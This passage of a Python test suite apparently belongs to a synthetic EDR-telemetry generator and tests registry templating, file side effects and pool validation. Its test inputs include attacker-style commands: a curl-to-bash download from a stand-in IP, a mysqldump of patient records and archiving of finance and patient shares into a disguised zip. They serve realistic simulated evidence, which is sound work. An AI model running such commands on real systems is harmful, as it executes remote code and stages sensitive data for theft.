            "publisher": "Contoso Ltd.",
            "version": "8.4.2",
        }
        with patch(
            "evidenceforge.generation.activity.edr_pools.load_edr_pools",
            return_value={"installed_software_products": [product]},
        ):
            key, publisher, version = materialize_edr_template_group(
                (
                    r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{{{installed_product_guid}}}",
                    "{installed_product_publisher}",
                    "{installed_product_version}",
                ),
                random.Random(5),
                host_key="WS-EBROOKS-01",
            )

        assert "{" in key and "}" in key
        assert publisher == "Contoso Ltd."
        assert version == "8.4.2"

    def test_materializes_defender_platform_with_product_version_shape(self):
        import random

        value = materialize_edr_template(
            r"C:\ProgramData\Microsoft\Windows Defender\Platform\{version}\MpClient.dll",
            random.Random(9),
            host_key="WS-01",
        )

        assert rf"\Platform\{defender_platform_version('WS-01')}\MpClient.dll" in value
        assert "\\125.0\\" not in value
        assert "\\2024.3\\" not in value

    def test_materializes_cbs_package_build_from_host_os(self):
        import random

        template = (
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing"
            r"\Packages\{package}~31bf3856ad364e35~amd64~~{os_build}.{small}"
        )
        server_2022 = materialize_edr_template(
            template,
            random.Random(9),
            host_key="DC-01",
            host_os="Windows Server 2022",
        )
        workstation_11 = materialize_edr_template(
            template,
            random.Random(9),
            host_key="WS-01",
            host_os="Windows 11",
        )

        assert "~~10.0.20348." in server_2022
        assert "~~10.0.22621." in workstation_11
        assert "10.0.19041" not in server_2022
        assert "10.0.19041" not in workstation_11

    def test_materializes_cbs_package_build_in_template_group(self):
        import random

        key, value_name, details = materialize_edr_template_group(
            (
                r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing"
                r"\Packages\{package}~31bf3856ad364e35~amd64~~{os_build}.{small}",
                "CurrentState",
                "DWORD (0x00000070)",
            ),
            random.Random(11),
            host_key="FILE-SRV-01",
            host_os="Windows Server 2019",
        )

        assert "~~10.0.17763." in key
        assert value_name == "CurrentState"
        assert details == "DWORD (0x00000070)"

    def test_normalizes_defender_platform_version_per_host(self):
        version = defender_platform_version("WS-01")

        assert (
            normalize_defender_platform_path(
                r"C:\ProgramData\Microsoft\Windows Defender\Platform\MpClient.dll",
                "WS-01",
            )
            == rf"C:\ProgramData\Microsoft\Windows Defender\Platform\{version}\MpClient.dll"
        )
        assert (
            normalize_defender_platform_path(
                r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpClient.dll",
                "WS-01",
            )
            == rf"C:\ProgramData\Microsoft\Windows Defender\Platform\{version}\MpClient.dll"
        )

    def test_materializes_related_templates_with_shared_placeholders(self):
        import random

        key, details = materialize_edr_template_group(
            (
                r"HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\app-{doc}.exe",
                r"C:\Program Files\Common Files\Vendor\app-{doc}.exe",
            ),
            random.Random(11),
        )

        key_doc = key.rsplit("app-", 1)[1].split(".exe", 1)[0]
        details_doc = details.rsplit("app-", 1)[1].split(".exe", 1)[0]
        assert key_doc == details_doc


class TestFileSideEffectRealism:
    def test_default_side_effect_pools_do_not_leak_generator_names(self):
        data = load_edr_pools()
        haystack = str(data)
        assert "eforge-" not in haystack
        assert "artifact-" not in haystack

    def test_file_side_effect_actions_all_have_event_type_mapping(self):
        from evidenceforge.generation.activity.generator import _FILE_ACTION_EVENT_TYPES
        from evidenceforge.generation.emitters.ecar import EcarEmitter

        config_actions = {
            str(action).lower()
            for profile in load_edr_pools().get("file_side_effect_profiles", [])
            for action in profile.get("actions", [])
        }
        command_samples = (
            ("gzip", "gzip -9 /tmp/patient_claims.sql"),
            ("mysqldump", "mysqldump ehr patients > /tmp/patient_claims.sql"),
            (
                "powershell.exe",
                r"powershell.exe -NoProfile -Command Compress-Archive "
                r"-Path C:\ProgramData\Microsoft\*.log "
                r"-DestinationPath C:\ProgramData\Microsoft\health-cache.zip",
            ),
        )
        command_actions = {
            effect[0]
            for process_name, command_line in command_samples
            if (effect := select_command_file_side_effect(process_name, command_line)) is not None
        }
        missing = (config_actions | command_actions) - set(_FILE_ACTION_EVENT_TYPES)

        assert not missing, f"file side-effect actions with no event mapping: {sorted(missing)}"
        assert _FILE_ACTION_EVENT_TYPES["read"] == "file_read"
        unrenderable = set(_FILE_ACTION_EVENT_TYPES.values()) - EcarEmitter._supported_types
        assert not unrenderable, f"file-effect event types eCAR cannot render: {unrenderable}"

    def test_gzip_side_effect_uses_compressed_operand_path(self):
        effect = select_file_side_effect(
            "gzip",
            "gzip -9 /tmp/patient_claims.sql",
            "linux",
            random.Random(7),
            user="root",
        )

        assert effect == ("create", "/tmp/patient_claims.sql.gz")

    def test_mysqldump_side_effect_uses_redirect_path(self):
        effect = select_file_side_effect(
            "mysqldump",
            "mysqldump ehr patients > /tmp/patient_claims.sql",
            "linux",
            random.Random(7),
            user="root",
        )

        assert effect == ("create", "/tmp/patient_claims.sql")

    def test_powershell_compress_archive_uses_destination_path(self):
        effect = select_file_side_effect(
            "powershell.exe",
            (
                r"powershell.exe -NoProfile -Command Compress-Archive "
                r"-Path C:\ProgramData\Microsoft\*.log "
                r"-DestinationPath C:\ProgramData\Microsoft\health-cache.zip"
            ),
            "windows",
            random.Random(7),
            user="alice",
        )

        assert effect == ("create", r"C:\ProgramData\Microsoft\health-cache.zip")

    def test_powershell_compress_archive_strips_outer_command_quote(self):
        effect = select_file_side_effect(
            "powershell.exe",
            (
                r'powershell.exe -NoProfile -Command "Compress-Archive '
                r"-Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* "
                r'-DestinationPath C:\ProgramData\Microsoft\health-cache.zip"'
            ),
            "windows",
            random.Random(7),
            user="svc_sqlreader",
        )

        assert effect == ("create", r"C:\ProgramData\Microsoft\health-cache.zip")

    def test_cmd_does_not_write_powershell_history_artifact(self):
        effects = {
            select_file_side_effect(
                "cmd.exe",
                "cmd.exe /c whoami && hostname",
                "windows",
                random.Random(seed),
                user="aisha.johnson",
            )
            for seed in range(30)
        }

        assert all(effect is None or "PSReadLine" not in effect[1] for effect in effects)

    def test_noninteractive_powershell_does_not_write_psreadline_artifact(self):
        effects = {
            select_file_side_effect(
                "powershell.exe",
                "powershell.exe -NoProfile -EncodedCommand SQBFAFgA",
                "windows",
                random.Random(seed),
                user="SYSTEM",
            )
            for seed in range(30)
        }

        assert all(effect is None or "PSReadLine" not in effect[1] for effect in effects)

    def test_noninteractive_web_shell_does_not_write_bash_history_artifact(self):
        effects = {
            select_file_side_effect(
                "bash",
                "bash -c 'curl http://10.0.0.5/s.sh | bash'",
                "linux",
                random.Random(seed),
                user="apache",
            )
            for seed in range(20)
        }

        assert all(effect is None or not effect[1].endswith("/.bash_history") for effect in effects)


class TestOverlayValidation:
    """Test fallback behavior for malformed overlay-provided pools."""

    def test_sanitize_empty_string_pools_falls_back_to_defaults(self):
        defaults = {
            "file_paths_windows": [r"C:\\Windows\\Temp\\x.tmp"],
            "file_paths_linux": ["/tmp/x.tmp"],
            "dll_pool": [r"C:\\Windows\\System32\\kernel32.dll"],
            "runmru_commands": ["cmd.exe /k dir"],
            "registry_keys_hkcu": [["HKCU\\Software\\X", "Enabled", "DWORD (0x00000001)"]],
            "registry_keys_hklm": [["HKLM\\Software\\X", "Enabled", "DWORD (0x00000001)"]],
        }
        merged = {**defaults, "file_paths_windows": [], "dll_pool": [], "runmru_commands": []}

        sanitized = _sanitize_edr_pools(defaults, merged)

        assert sanitized["file_paths_windows"] == defaults["file_paths_windows"]
        assert sanitized["dll_pool"] == defaults["dll_pool"]
        assert sanitized["runmru_commands"] == defaults["runmru_commands"]

    def test_sanitize_malformed_registry_pool_falls_back_to_defaults(self):
        defaults = {
            "file_paths_windows": [r"C:\\Windows\\Temp\\x.tmp"],
            "file_paths_linux": ["/tmp/x.tmp"],
            "dll_pool": [r"C:\\Windows\\System32\\kernel32.dll"],
            "runmru_commands": ["cmd.exe /k dir"],
            "registry_keys_hkcu": [["HKCU\\Software\\X", "Enabled", "DWORD (0x00000001)"]],
            "registry_keys_hklm": [["HKLM\\Software\\X", "Enabled", "DWORD (0x00000001)"]],
        }
        merged = {**defaults, "registry_keys_hkcu": {"bad": "shape"}}

        sanitized = _sanitize_edr_pools(defaults, merged)

        assert sanitized["registry_keys_hkcu"] == defaults["registry_keys_hkcu"]

    def test_sanitize_malformed_group_policy_guid_pool_falls_back_to_defaults(self):
        defaults = {
            "file_paths_windows": [r"C:\\Windows\\Temp\\x.tmp"],
            "file_paths_linux": ["/tmp/x.tmp"],
            "dll_pool": [r"C:\\Windows\\System32\\kernel32.dll"],
            "runmru_commands": ["cmd.exe /k dir"],
            "registry_keys_hkcu": [["HKCU\\Software\\X", "Enabled", "DWORD (0x00000001)"]],
            "registry_keys_hklm": [["HKLM\\Software\\X", "Enabled", "DWORD (0x00000001)"]],
            "group_policy_extension_guids": ["35378EAC-683F-11D2-A89A-00C04FBBCFA2"],
        }
        merged = {**defaults, "group_policy_extension_guids": ["not-a-guid"]}

        sanitized = _sanitize_edr_pools(defaults, merged)

        assert sanitized["group_policy_extension_guids"] == defaults["group_policy_extension_guids"]
